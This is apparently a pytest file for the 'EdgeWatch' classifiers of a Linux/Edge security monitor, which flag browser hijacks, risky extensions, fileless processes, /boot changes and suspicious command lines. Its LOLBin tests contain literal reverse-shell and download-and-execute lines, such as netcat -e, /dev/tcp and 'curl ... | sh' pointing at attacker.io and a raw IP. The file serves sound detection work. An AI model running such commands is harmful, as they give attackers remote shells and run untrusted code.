"""Tests puros del clasificador EdgeWatch (sin tocar FS ni /proc)."""
from centinel.collectors.edgewatch import (
    classify_search_provider,
    classify_homepage,
    classify_extension,
    classify_cmdline,
    classify_exe_link,
    diff_boot,
)


# --- Search provider ---------------------------------------------------------

def test_search_bing_no_alerta():
    bad, _ = classify_search_provider(
        "https://www.bing.com/search?q={searchTerms}")
    assert not bad


def test_search_google_no_alerta():
    bad, _ = classify_search_provider(
        "https://www.google.com/search?q={searchTerms}")
    assert not bad


def test_search_dominio_raro_es_hijack():
    bad, why = classify_search_provider(
        "https://search-suspicious.io/?q={searchTerms}")
    assert bad
    assert "search-suspicious.io" in why


def test_search_protocolo_javascript_es_hijack():
    bad, why = classify_search_provider(
        "javascript:alert(1)")
    assert bad
    assert "protocolo" in why


def test_search_vacio_no_alerta():
    bad, _ = classify_search_provider("")
    assert not bad


# --- Homepage ----------------------------------------------------------------

def test_homepage_about_blank_no_alerta():
    bad, _ = classify_homepage("about:blank")
    assert not bad


def test_homepage_newtab_no_alerta():
    bad, _ = classify_homepage("edge://newtab/")
    assert not bad


def test_homepage_bing_no_alerta():
    bad, _ = classify_homepage("https://www.bing.com/")
    assert not bad


def test_homepage_dominio_raro_es_hijack():
    bad, why = classify_homepage("https://my-search-portal.club/")
    assert bad
    assert "inusual" in why


def test_homepage_file_local_es_hijack():
    bad, why = classify_homepage("file:///tmp/index.html")
    assert bad
    assert "fichero local" in why


# --- Extensión ---------------------------------------------------------------

def test_ext_id_store_sin_permisos_peligrosos_no_alerta():
    # ID válido del store (32 chars a-p) + permisos mansos.
    bad, _ = classify_extension(
        "a" * 32, {"permissions": ["storage", "activeTab"]})
    assert not bad


def test_ext_sideloaded_con_webrequest_es_critico():
    bad, why = classify_extension(
        "weird_id_not_from_store",
        {"permissions": ["webRequest", "<all_urls>"]})
    assert bad
    assert "sideloaded" in why


def test_ext_triad_infostealer_es_critico():
    # Aun con ID del store: webRequest + cookies + <all_urls> = infostealer.
    bad, why = classify_extension(
        "a" * 32,
        {"permissions": ["webRequest", "cookies", "<all_urls>"]})
    assert bad
    assert "infostealer" in why


def test_ext_manifest_vacio_no_alerta():
    bad, _ = classify_extension("a" * 32, {})
    assert not bad


def test_ext_manifest_no_dict_no_alerta():
    bad, _ = classify_extension("a" * 32, None)  # type: ignore[arg-type]
    assert not bad


# --- LOLBin cmdline ----------------------------------------------------------

def test_cmdline_normal_no_alerta():
    bad, _ = classify_cmdline("/usr/bin/python3 -m http.server")
    assert not bad


def test_cmdline_base64_pipe_bash_es_lolbin():
    bad, why = classify_cmdline("echo aGVsbG8K | base64 -d | bash")
    assert bad
    assert "base64" in why


def test_cmdline_curl_pipe_sh_es_lolbin():
    bad, why = classify_cmdline("curl -fsSL http://attacker.io/x.sh | sh")
    assert bad
    assert "descarga-y-ejecuta" in why


def test_cmdline_python_socket_es_lolbin():
    bad, why = classify_cmdline(
        'python3 -c "import socket,os,pty;s=socket.socket()"')
    assert bad
    assert "python" in why


def test_cmdline_nc_dash_e_es_lolbin():
    bad, why = classify_cmdline("nc -e /bin/bash attacker.io 4444")
    assert bad
    assert "netcat" in why


def test_cmdline_devtcp_es_lolbin():
    bad, why = classify_cmdline(
        "bash -i >& /dev/tcp/45.135.232.17/4444 0>&1")
    assert bad
    assert "/dev/tcp" in why


# --- exe link / fileless -----------------------------------------------------

def test_exe_link_normal_no_alerta():
    bad, _ = classify_exe_link("/usr/bin/bash")
    assert not bad


def test_exe_link_deleted_es_fileless():
    bad, why = classify_exe_link("/tmp/payload (deleted)")
    assert bad
    assert "borrado" in why


def test_exe_link_memfd_es_fileless():
    bad, why = classify_exe_link("/memfd:payload (deleted)")
    assert bad
    # Acepta cualquiera de las dos razones (memfd O deleted).
    assert ("memfd" in why) or ("borrado" in why)


def test_exe_link_vacio_no_alerta():
    bad, _ = classify_exe_link("")
    assert not bad


# --- Diff de /boot -----------------------------------------------------------

def test_boot_diff_nuevo_fichero():
    baseline = {"/boot/vmlinuz-6.1": 100.0}
    current = {"/boot/vmlinuz-6.1": 100.0, "/boot/rootkit.bin": 200.0}
    msgs = diff_boot(baseline, current)
    assert any("nuevo" in m and "rootkit.bin" in m for m in msgs)


def test_boot_diff_modificado():
    baseline = {"/boot/vmlinuz-6.1": 100.0}
    current = {"/boot/vmlinuz-6.1": 999.0}
    msgs = diff_boot(baseline, current)
    assert any("modificado" in m for m in msgs)


def test_boot_diff_borrado():
    baseline = {"/boot/initrd.img": 100.0}
    current: dict[str, float] = {}
    msgs = diff_boot(baseline, current)
    assert any("borrado" in m for m in msgs)


def test_boot_diff_sin_cambios():
    baseline = {"/boot/vmlinuz-6.1": 100.0}
    msgs = diff_boot(baseline, baseline)
    assert msgs == []
